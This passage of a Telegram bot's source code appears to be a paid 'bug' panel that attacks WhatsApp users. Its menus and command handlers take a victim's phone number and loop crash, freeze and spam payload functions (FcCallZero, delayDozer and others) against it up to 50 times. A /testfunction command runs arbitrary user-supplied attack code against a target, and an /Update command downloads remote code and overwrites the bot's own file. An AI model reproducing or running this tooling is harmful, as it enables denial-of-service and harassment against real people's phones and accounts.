⬡═―—⊱ MURBUG TYPE ⊰―—═⬡
  /majesticdelay      - 628xx [ DELAY FOR MURBUG ]
  /specterdelay     - 628xx [ DELAY HARD BEBAS SPAM ]
  /magicdelay     - 628xx [ HARD DELAY 1000% ]
  /twinsdelay     - 628xx [ BEBAS SPAM NO LOG OUT ]
  /spamdelay     - 628xx [ BEBAS SPAM DELAY ]
  /sweetydelay     - 628xx [ SPAM DELAY 1000% ]

🌙 RAMADAN KAREEM 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug5Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug6', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug6Menu = `\`\`\`js
🌙 IOS BUG 🌙

⬡═―—⊱ IOS TYPE ⊰―—═⬡
  /iosinvis    - 628xx [ FORCLOSE IOS ]
  /iosdelay    - 628xx [ DELAY HARD IOS ]

🌙 RAMADAN KAREEM 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug6Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug7', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug7Menu = `\`\`\`js  
🌙 INVISBLE ANDRO BUG 🌙

⬡═―—⊱ INVISBLE TYPE ⊰―—═⬡
  /crashandroid   - 628xx [ CRASH INVIS ]
  /crashdocu      - 628xx [ CRASH HARD VISIBLE ]
  /combocrash     - 628xx [ CRASH X BLANK ]

🌙 RAMADAN KAREEM 🌙 
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug7Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const toolsMenu = `\`\`\`js   
⬡═―—⊱ OPTIONS & TOOLS ⊰―—═⬡
  /nfsw       - Anime Hentai
  /waifu      - Anime Waifu
  /anime      - Anime Girl

🌙 RAMADHAN KAREEM 🌙

🌙 Page 3/5 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/controls"
            },
            {
                text: "Owner", 
                url: "https://t.me/Yanzzuul"   
            },
            {   
                text: "➡️ Next",
                callback_data: "/bug"                  
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const tqtoMenu = `\`\`\`js    
🌙 RAMADHAN 1447H 🌙

⬡═―—⊱ THANKS TO ⊰―—═⬡
  Xatanical   ( Best Support )
  Sanzz  ( Friend )
  Zunn    ( Friend )
  Xwarr  ( Support ) 
  GabrielWolf  ( Support )
  Linzz    ( Friend )
  Zep        ( Support )
  Takashi     ( Support )
  All Buyer MAJESTY'S PŌVA
  All Partner & Owner Sans

🌙 Page 5/5 🌙
🤲 RAMADHAN KAREEM 🤲
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/tools"
            },
            {
                text: "Owner", 
                url: "https://t.me/Yanzzuul"   
            },
            {   
                text: "Home",
                callback_data: "/start"                  
            },
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

//case tools
bot.command("checkgroupid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /checkgroupid https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐕𝚯𝐋𝐓𝐑𝐈𝐗 𝐄𝐍𝐆𝐈𝐍𝐄 ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

bot.command("nfsw", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.replyWithPhoto("https://files.catbox.moe/fw550e.jpg", "https://files.catbox.moe/20mu8c.jpg", "https://files.catbox.moe/vchvns.jpg", "https://files.catbox.moe/v9sc86.jpg");
});

bot.command("anime", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url); }
  catch { ctx.reply("❌ Gagal mengambil gambar anime"); }
});

bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});

//case bug
bot.command("ghostdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ghostdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await gsDelay(sock, target);
    await gsProtocol(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("extradelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /extradelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await PouDelayInvis2(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("extremeforclose", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /extremeforclose 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await FcCallZero(sock, target);
    await OfferXForclose(sock, target);
    await ForceSqlVc(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ghostfc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ghostfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await maklufc(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("invisbleandro", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /invisbleandro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await maklufc(target);
    await FcCallZero(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("buldozerdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /buldozerdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delayDozer(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("sixbuldozer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /sixbuldozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await RxCXavior(sock, jid);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("majesticdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /majesticdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delayAth(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("specterdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /specterdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await specterdelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("magicdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /magicdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await magicdelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("twinsdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /twinsdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delaybountyX(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("spamdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /spamdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delaymieayam(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("sweetydelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /sweetydelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await Sweetydelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
MAJESTY'S PŌVA ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<<blockquote>⬡═―—⊱ ⎧ NEXUS VLOID ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>⬡═―—⊱ ⎧ NEXUS VLOID ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("Update", async (ctx) => {
    const chatId = ctx.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/yanzvxc0031/AutoUpdate/main/index.js";

    ctx.telegram.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return ctx.telegram.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        ctx.telegram.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        ctx.telegram.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});


// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  process.exit((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      process.exit(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

// Function Bug

bot.launch()
